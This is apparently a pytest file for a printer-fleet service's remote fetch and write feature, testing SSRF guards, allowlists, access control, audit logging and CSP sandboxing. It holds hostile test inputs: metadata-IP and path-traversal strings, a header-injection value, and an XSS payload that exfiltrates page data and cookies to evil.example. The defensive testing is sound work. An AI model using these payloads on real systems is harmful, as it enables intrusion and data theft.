"""Remote hands, central side: the gates, the isolation, and the audit trail.

This is the feature that widens the blast radius, so what is asserted here is
mostly what must NOT happen: an operator cannot aim the agent at an address they
chose, a device is never assumed writable, a hostile page never executes in our
origin, and every refusal leaves a row somebody can find.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from central import models as m
from central import remote as policy
from central import runtime
from central.main import app
from central.security import hash_api_key, hash_password


# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #
def _fleet(db, *, ip: str = "10.10.0.5"):
    client = m.Client(name="Acme")
    db.add(client)
    db.flush()
    site = m.Site(client_id=client.id, name="HQ")
    db.add(site)
    db.flush()
    agent = m.Agent(site_id=site.id, name="hq", api_key_hash=hash_api_key("pn_agentkey"))
    db.add(agent)
    db.flush()
    printer = m.Printer(
        client_id=client.id, site_id=site.id, ip=ip, model="MFC-L8900CDW",
        discovery_state=m.DiscoveryState.approved, discovered_by_agent_id=agent.id,
    )
    db.add(printer)
    db.commit()
    return client, site, agent, printer


def _login(db, role: m.UserRole = m.UserRole.tech) -> TestClient:
    pwd = "pw-" + role.value
    db.add(m.User(username="u_" + role.value, password_hash=hash_password(pwd), role=role))
    db.commit()
    cli = TestClient(app)
    resp = cli.post(
        "/login", data={"username": "u_" + role.value, "password": pwd},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    return cli


def _settings(db, *, enabled: bool = True, allow_writes: bool = False, **values):
    """Write the Remote hands section.

    Scoped to that ONE section on purpose. ``save_settings`` reads a bool as
    "present in the form means checked", so ``{"remote.enabled": False}`` sets
    it to *True* -- the checkbox-presence rule this codebase documents, and the
    thing a test helper gets wrong first. Passing the section and omitting the
    key is the only way to record False, and scoping to one section is what
    stops that clearing every other bool in the database.
    """
    form = dict(values)
    if enabled:
        form["remote.enabled"] = "on"
    if allow_writes:
        form["remote.allow_writes"] = "on"
    runtime.save_settings(db, form, sections={"Remote hands"})
    db.commit()


def _audit(db, action: str) -> list:
    return list(db.scalars(select(m.AuditLog).where(m.AuditLog.action == action)))


# --------------------------------------------------------------------------- #
# Address validation -- the SSRF boundary
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "addr",
    [
        "169.254.169.254",   # cloud instance metadata, on every major provider
        "127.0.0.1",         # the agent host itself
        "::1",
        "::ffff:127.0.0.1",  # loopback wearing IPv6 clothing
        "0.0.0.0",
        "224.0.0.1",
        "fe80::1",
        "printer.local",     # a NAME: never resolved, so never accepted
        "",
    ],
)
def test_refused_device_addresses(addr):
    with pytest.raises(policy.RemoteError):
        policy.validate_device_address(addr)


@pytest.mark.parametrize("addr", ["10.1.2.3", "192.168.0.9", "172.16.4.4", "203.0.113.9"])
def test_accepted_device_addresses(addr):
    # Private space is the NORMAL case for a printer, so it must pass -- this is
    # exactly where the events destination policy and this one differ.
    assert policy.validate_device_address(addr) == addr


@pytest.mark.parametrize(
    "path",
    [
        "//evil.example/x",          # protocol-relative: would change the host
        "http://evil.example/x",     # a full URL, not a path
        "/a/../../etc/passwd",
        "/x y",                      # whitespace
        "/x\r\nHost: evil",          # header injection shape
        "/x#frag",
        "/" + "a" * 600,
    ],
)
def test_refused_paths(path):
    with pytest.raises(policy.RemoteError):
        policy.validate_path(path)


def test_blank_path_is_root():
    assert policy.validate_path("") == "/"
    assert policy.validate_path("/general/status.html?x=1&y=2") == "/general/status.html?x=1&y=2"


@pytest.mark.parametrize("port", [22, 9100, 3389, 0, 65536, "eighty"])
def test_refused_ports(port):
    with pytest.raises(policy.RemoteError):
        policy.validate_port(port)


def test_allowed_ports():
    for port in policy.ALLOWED_PORTS:
        assert policy.validate_port(str(port)) == port


# --------------------------------------------------------------------------- #
# Write vocabulary
# --------------------------------------------------------------------------- #
def test_write_vocabulary_is_closed():
    with pytest.raises(policy.RemoteError):
        policy.validate_write("set_admin_password", "hunter2")
    with pytest.raises(policy.RemoteError):
        policy.validate_write("", "x")


def test_restart_value_is_a_server_constant():
    """The operator cannot choose the reset value.

    prtGeneralReset has four; resetToDefaults(6) wipes a device's network
    config, which is how a remote action strands a printer. Only powerCycleReset
    is expressible, and whatever the caller sends is discarded.
    """
    op, value = policy.validate_write("restart", "6")
    assert value == "4"
    assert op.verifiable is False


def test_written_text_is_bounded_and_control_free():
    with pytest.raises(policy.RemoteError):
        policy.validate_write("set_location", "x" * 500)
    with pytest.raises(policy.RemoteError):
        policy.validate_write("set_location", "Front desk\r\nX")
    with pytest.raises(policy.RemoteError):
        policy.validate_write("set_location", "   ")
    op, value = policy.validate_write("set_location", "  Front desk  ")
    assert (op.key, value) == ("set_location", "Front desk")


# --------------------------------------------------------------------------- #
# The fetch route
# --------------------------------------------------------------------------- #
def test_fetch_queues_a_command_carrying_the_printers_own_address(db):
    _client, _site, agent, printer = _fleet(db, ip="10.10.0.5")
    cli = _login(db)

    resp = cli.post(
        f"/manage/printers/{printer.id}/remote/fetch",
        data={"path": "/general/status.html", "scheme": "http", "port": "80"},
        follow_redirects=False,
    )
    assert resp.status_code == 303

    cmd = db.scalars(select(m.Command)).one()
    assert cmd.type == m.CommandType.remote_fetch
    assert cmd.agent_id == agent.id
    # The address is the printer row's, never anything the form carried.
    assert cmd.payload["ip"] == "10.10.0.5"
    assert cmd.payload["path"] == "/general/status.html"

    req = db.scalars(select(m.RemoteRequest)).one()
    assert req.kind == m.RemoteRequestKind.fetch
    assert req.status == m.RemoteRequestStatus.pending
    assert req.command_id == cmd.id
    assert req.requested_by == "u_tech"

    rows = _audit(db, "remote.fetch")
    assert len(rows) == 1 and "10.10.0.5" in rows[0].detail


def test_fetch_refuses_a_hostile_path_and_audits_the_refusal(db):
    _c, _s, _a, printer = _fleet(db)
    cli = _login(db)
    resp = cli.post(
        f"/manage/printers/{printer.id}/remote/fetch",
        data={"path": "//evil.example/", "scheme": "http", "port": "80"},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert db.scalars(select(m.Command)).all() == []
    assert db.scalars(select(m.RemoteRequest)).all() == []
    # A refusal is recorded, not merely rejected: a proxy is a good pivot, so
    # "somebody kept trying and was stopped" has to be findable.
    assert len(_audit(db, "remote.refused")) == 1


def test_a_printer_on_a_refused_address_cannot_be_fetched(db):
    _c, _s, _a, printer = _fleet(db, ip="169.254.169.254")
    cli = _login(db)
    resp = cli.post(
        f"/manage/printers/{printer.id}/remote/fetch",
        data={"path": "/", "scheme": "http", "port": "80"},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert db.scalars(select(m.Command)).all() == []
    assert len(_audit(db, "remote.refused")) == 1


def test_client_readonly_cannot_reach_any_remote_route(db):
    _c, _s, _a, printer = _fleet(db)
    cli = _login(db, m.UserRole.client_readonly)
    for path, data in (
        (f"/manage/printers/{printer.id}/remote/fetch", {"path": "/"}),
        (f"/manage/printers/{printer.id}/remote/probe", {}),
        (f"/manage/printers/{printer.id}/remote/write", {"op": "restart"}),
        (f"/manage/printers/{printer.id}/remote/pin-read-only", {"disabled": "1"}),
    ):
        resp = cli.post(path, data=data, follow_redirects=False)
        # Refused, not redirected to sign in -- they already are.
        assert resp.status_code == 403
    assert db.scalars(select(m.Command)).all() == []


def test_disabled_feature_queues_nothing(db):
    _c, _s, _a, printer = _fleet(db)
    _settings(db, enabled=False)
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/fetch",
             data={"path": "/"}, follow_redirects=False)
    assert db.scalars(select(m.Command)).all() == []


def test_rate_limit_refuses_a_second_request_inside_the_window(db):
    _c, _s, _a, printer = _fleet(db)
    _settings(db, **{"remote.min_interval_seconds": 60})
    cli = _login(db)
    for _ in range(2):
        cli.post(f"/manage/printers/{printer.id}/remote/fetch",
                 data={"path": "/"}, follow_redirects=False)
    assert len(db.scalars(select(m.Command)).all()) == 1
    assert len(_audit(db, "remote.refused")) == 1


def test_outstanding_cap_refuses_when_the_queue_is_full(db):
    _c, _s, _a, printer = _fleet(db)
    _settings(db, **{"remote.min_interval_seconds": 0, "remote.max_open_per_printer": 2})
    cli = _login(db)
    for _ in range(3):
        cli.post(f"/manage/printers/{printer.id}/remote/fetch",
                 data={"path": "/"}, follow_redirects=False)
    assert len(db.scalars(select(m.RemoteRequest)).all()) == 2
    assert len(_audit(db, "remote.refused")) == 1


# --------------------------------------------------------------------------- #
# Capability: probed, never inferred
# --------------------------------------------------------------------------- #
def test_a_new_printer_is_not_writable(db):
    _c, _s, _a, printer = _fleet(db)
    assert printer.remote_capability == m.RemoteCapability.unknown
    _settings(db, allow_writes=True)
    settings = runtime.load_settings(db)
    # unknown behaves exactly like read_only: never proven, so never written to.
    assert policy.writes_allowed(printer, settings) is not None


def test_write_is_refused_until_a_probe_proves_the_device(db):
    _c, _s, _a, printer = _fleet(db)
    _settings(db, allow_writes=True)
    cli = _login(db)
    resp = cli.post(f"/manage/printers/{printer.id}/remote/write",
                    data={"op": "set_location", "value": "Front desk"},
                    follow_redirects=False)
    assert resp.status_code == 303
    assert db.scalars(select(m.Command)).all() == []
    detail = _audit(db, "remote.refused")[0].detail
    assert "not been proven writable" in detail


def test_write_is_refused_while_the_setting_is_off_even_on_a_proven_device(db):
    _c, _s, _a, printer = _fleet(db)
    printer.remote_capability = m.RemoteCapability.writable
    db.commit()
    cli = _login(db)   # remote.allow_writes defaults False
    cli.post(f"/manage/printers/{printer.id}/remote/write",
             data={"op": "set_location", "value": "x"}, follow_redirects=False)
    assert db.scalars(select(m.Command)).all() == []
    assert "switched off" in _audit(db, "remote.refused")[0].detail


def test_operator_can_pin_read_only_but_there_is_no_pin_writable(db):
    _c, _s, _a, printer = _fleet(db)
    printer.remote_capability = m.RemoteCapability.writable
    db.commit()
    _settings(db, allow_writes=True)
    cli = _login(db)

    cli.post(f"/manage/printers/{printer.id}/remote/pin-read-only",
             data={"disabled": "1"}, follow_redirects=False)
    db.refresh(printer)
    assert printer.remote_write_disabled is True
    assert len(_audit(db, "remote.pin_read_only")) == 1

    cli.post(f"/manage/printers/{printer.id}/remote/write",
             data={"op": "restart"}, follow_redirects=False)
    assert db.scalars(select(m.Command)).all() == []
    assert "pinned off" in _audit(db, "remote.refused")[0].detail

    # And nothing anywhere sets remote_capability from an operator form.
    from central.dashboard import remote as remote_routes
    source = __import__("inspect").getsource(remote_routes)
    assert "remote_capability =" not in source


def test_a_proven_device_queues_the_write_with_the_operation_audited(db):
    _c, _s, agent, printer = _fleet(db)
    printer.remote_capability = m.RemoteCapability.writable
    db.commit()
    _settings(db, allow_writes=True)
    cli = _login(db)

    cli.post(f"/manage/printers/{printer.id}/remote/write",
             data={"op": "set_location", "value": "Front desk"}, follow_redirects=False)
    cmd = db.scalars(select(m.Command)).one()
    assert cmd.type == m.CommandType.remote_write
    assert cmd.payload["oid"] == "1.3.6.1.2.1.1.6.0"
    assert cmd.payload["value"] == "Front desk"
    assert cmd.agent_id == agent.id

    detail = _audit(db, "remote.write")[0].detail
    assert "op=set_location" in detail and "value=Front desk" in detail


# --------------------------------------------------------------------------- #
# Results come back from the agent
# --------------------------------------------------------------------------- #
def _agent_client() -> TestClient:
    return TestClient(app)


def test_agent_posts_a_fetch_result_and_it_is_stored(db):
    _c, _s, agent, printer = _fleet(db)
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/fetch",
             data={"path": "/"}, follow_redirects=False)
    req = db.scalars(select(m.RemoteRequest)).one()

    resp = _agent_client().post(
        f"/api/v1/agents/{agent.id}/remote-results/{req.id}",
        headers={"Authorization": "Bearer pn_agentkey"},
        json={"ok": True, "http_status": 200, "content_type": "text/html",
              "body": "<h1>Ready</h1>", "body_bytes": 14, "truncated": False},
    )
    assert resp.status_code == 200 and resp.json()["accepted"] is True
    db.expire_all()
    req = db.get(m.RemoteRequest, req.id)
    assert req.status == m.RemoteRequestStatus.succeeded
    assert req.body == "<h1>Ready</h1>"
    # A FETCH says nothing about SNMP writability and must not touch it.
    assert db.get(m.Printer, printer.id).remote_capability == m.RemoteCapability.unknown


def test_a_probe_verdict_records_capability_both_ways(db):
    _c, _s, agent, printer = _fleet(db)
    cli = _login(db)

    def probe_result(payload):
        cli.post(f"/manage/printers/{printer.id}/remote/probe", follow_redirects=False)
        req = db.scalars(
            select(m.RemoteRequest).order_by(m.RemoteRequest.id.desc()).limit(1)
        ).one()
        resp = _agent_client().post(
            f"/api/v1/agents/{agent.id}/remote-results/{req.id}",
            headers={"Authorization": "Bearer pn_agentkey"}, json=payload,
        )
        assert resp.status_code == 200
        db.expire_all()
        return db.get(m.Printer, printer.id)

    _settings(db, **{"remote.min_interval_seconds": 0})
    # HP Secure-by-Default: reads work, writes are off. This is the COMMON case.
    p = probe_result({"ok": True, "writable": False,
                      "error": "the device refused a no-op write: noAccess"})
    assert p.remote_capability == m.RemoteCapability.read_only
    assert "noAccess" in p.remote_capability_detail
    assert p.remote_capability_at is not None

    p = probe_result({"ok": True, "writable": True})
    assert p.remote_capability == m.RemoteCapability.writable


def test_an_unreachable_probe_leaves_capability_alone(db):
    """"We could not ask" is never recorded as "the answer is no"."""
    _c, _s, agent, printer = _fleet(db)
    printer.remote_capability = m.RemoteCapability.writable
    db.commit()
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/probe", follow_redirects=False)
    req = db.scalars(select(m.RemoteRequest)).one()

    _agent_client().post(
        f"/api/v1/agents/{agent.id}/remote-results/{req.id}",
        headers={"Authorization": "Bearer pn_agentkey"},
        json={"ok": False, "error": "could not read a probe OID: timeout"},
    )
    db.expire_all()
    assert db.get(m.Printer, printer.id).remote_capability == m.RemoteCapability.writable
    assert db.get(m.RemoteRequest, req.id).status == m.RemoteRequestStatus.failed


def test_another_agent_cannot_answer_this_agents_request(db):
    _c, site, agent, printer = _fleet(db)
    other = m.Agent(site_id=site.id, name="other", api_key_hash=hash_api_key("pn_other"))
    db.add(other)
    db.commit()
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/fetch",
             data={"path": "/"}, follow_redirects=False)
    req = db.scalars(select(m.RemoteRequest)).one()

    resp = _agent_client().post(
        f"/api/v1/agents/{other.id}/remote-results/{req.id}",
        headers={"Authorization": "Bearer pn_other"},
        json={"ok": True, "http_status": 200, "body": "<b>mine now</b>"},
    )
    # 404, not 403 -- an id must not be probeable.
    assert resp.status_code == 404
    db.expire_all()
    assert db.get(m.RemoteRequest, req.id).body is None


def test_a_second_result_does_not_overwrite_the_first(db):
    _c, _s, agent, printer = _fleet(db)
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/fetch",
             data={"path": "/"}, follow_redirects=False)
    req = db.scalars(select(m.RemoteRequest)).one()
    agent_cli = _agent_client()
    headers = {"Authorization": "Bearer pn_agentkey"}
    url = f"/api/v1/agents/{agent.id}/remote-results/{req.id}"

    agent_cli.post(url, headers=headers, json={"ok": True, "http_status": 200, "body": "first"})
    second = agent_cli.post(url, headers=headers,
                            json={"ok": True, "http_status": 200, "body": "second"})
    assert second.json()["accepted"] is False
    db.expire_all()
    assert db.get(m.RemoteRequest, req.id).body == "first"


def test_an_oversize_body_is_refused_at_the_ingest(db):
    _c, _s, agent, printer = _fleet(db)
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/fetch",
             data={"path": "/"}, follow_redirects=False)
    req = db.scalars(select(m.RemoteRequest)).one()
    resp = _agent_client().post(
        f"/api/v1/agents/{agent.id}/remote-results/{req.id}",
        headers={"Authorization": "Bearer pn_agentkey"},
        json={"ok": True, "http_status": 200, "body": "x" * (policy.MAX_BODY_BYTES + 1)},
    )
    assert resp.status_code == 413
    db.expire_all()
    assert db.get(m.RemoteRequest, req.id).body is None


# --------------------------------------------------------------------------- #
# Rendering isolation
# --------------------------------------------------------------------------- #
HOSTILE = (
    "<script>fetch('/manage/users').then(r=>r.text())"
    ".then(t=>fetch('https://evil.example/x',{method:'POST',body:t}))</script>"
    "<img src=x onerror=alert(document.cookie)>"
    "<form action='/manage/printers/1/delete' method='post'><input name=x></form>"
)


def _capture(db, body: str, content_type: str = "text/html"):
    _c, _s, agent, printer = _fleet(db)
    cli = _login(db)
    cli.post(f"/manage/printers/{printer.id}/remote/fetch",
             data={"path": "/"}, follow_redirects=False)
    req = db.scalars(select(m.RemoteRequest)).one()
    _agent_client().post(
        f"/api/v1/agents/{agent.id}/remote-results/{req.id}",
        headers={"Authorization": "Bearer pn_agentkey"},
        json={"ok": True, "http_status": 200, "content_type": content_type,
              "body": body, "body_bytes": len(body)},
    )
    return cli, printer, req


def test_hostile_device_html_is_served_only_under_a_sandboxing_csp(db):
    cli, printer, req = _capture(db, HOSTILE)
    resp = cli.get(f"/manage/printers/{printer.id}/remote/{req.id}/body")
    assert resp.status_code == 200

    csp = resp.headers["content-security-policy"]
    # `sandbox` puts the document in an OPAQUE origin: no same-origin access to
    # our page, our storage or our cookies, and (with no allow-* token) no
    # scripts, no forms, no popups, no top-level navigation.
    assert "sandbox" in csp and "allow-scripts" not in csp and "allow-same-origin" not in csp
    # `default-src 'none'` means the document cannot fetch or beacon anything at
    # all -- no image, no stylesheet, no fetch, no form post.
    assert "default-src 'none'" in csp
    assert "form-action 'none'" in csp
    assert "frame-ancestors 'self'" in csp
    assert "base-uri 'none'" in csp
    assert resp.headers["x-content-type-options"] == "nosniff"
    assert resp.headers["referrer-policy"] == "no-referrer"
    assert resp.headers["cache-control"] == "no-store"
    # We NEVER echo the device's content type.
    assert resp.headers["content-type"].startswith("text/html")


def test_the_printer_page_frames_the_body_with_every_sandbox_restriction_on(db):
    cli, printer, req = _capture(db, HOSTILE)
    page = cli.get(f"/printers/{printer.id}").text
    assert 'sandbox=""' in page
    # The hostile markup itself is never inlined into the printer page.
    assert "<script>fetch(" not in page
    assert f"/manage/printers/{printer.id}/remote/{req.id}/body" in page


def test_a_non_html_body_is_escaped_rather_than_rendered(db):
    """A device that declares text/plain and sends markup gets shown as text."""
    cli, printer, req = _capture(db, "<script>alert(1)</script>", content_type="text/plain")
    resp = cli.get(f"/manage/printers/{printer.id}/remote/{req.id}/body")
    assert "&lt;script&gt;" in resp.text
    assert "<script>" not in resp.text


def test_the_body_route_requires_a_session_and_the_right_printer(db):
    cli, printer, req = _capture(db, HOSTILE)
    assert TestClient(app).get(
        f"/manage/printers/{printer.id}/remote/{req.id}/body"
    ).status_code == 401
    # Scoped: the request must belong to the printer in the URL.
    assert cli.get(f"/manage/printers/{printer.id + 999}/remote/{req.id}/body").status_code == 404


# --------------------------------------------------------------------------- #
# The command API must not be able to construct these
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("ctype", ["remote_fetch", "remote_probe", "remote_write"])
def test_remote_commands_are_not_enqueueable_through_the_json_api(db, ctype):
    _c, _s, agent, _p = _fleet(db)
    cli = _login(db, m.UserRole.admin)
    resp = cli.post(
        "/api/v1/commands",
        json={"agent_id": agent.id, "type": ctype,
              "payload": {"ip": "169.254.169.254", "path": "/", "request_id": 1}},
    )
    assert resp.status_code == 422
    # And with no payload at all, which is the case an allowlist of keys misses.
    resp = cli.post("/api/v1/commands", json={"agent_id": agent.id, "type": ctype})
    assert resp.status_code == 422
    assert db.scalars(select(m.Command)).all() == []


# --------------------------------------------------------------------------- #
# Expiry
# --------------------------------------------------------------------------- #
def test_a_stale_request_reads_as_expired_without_the_read_path_writing(db):
    from datetime import datetime, timedelta, timezone

    _c, _s, agent, printer = _fleet(db)
    old = datetime.now(timezone.utc) - timedelta(seconds=policy.REQUEST_TTL_SECONDS + 60)
    req = m.RemoteRequest(
        printer_id=printer.id, agent_id=agent.id, kind=m.RemoteRequestKind.fetch,
        status=m.RemoteRequestStatus.pending, created_at=old, path="/",
    )
    db.add(req)
    db.commit()

    assert policy.display_status(req) == "expired"
    # display_status is a pure read: the row is untouched until a POST sweeps it.
    assert req.status == m.RemoteRequestStatus.pending

    assert policy.expire_stale(db, printer.id) == 1
    db.commit()
    assert db.get(m.RemoteRequest, req.id).status == m.RemoteRequestStatus.expired
    # ...and an expired request no longer holds a slot against the cap.
    assert policy.open_requests(db, printer.id) == []
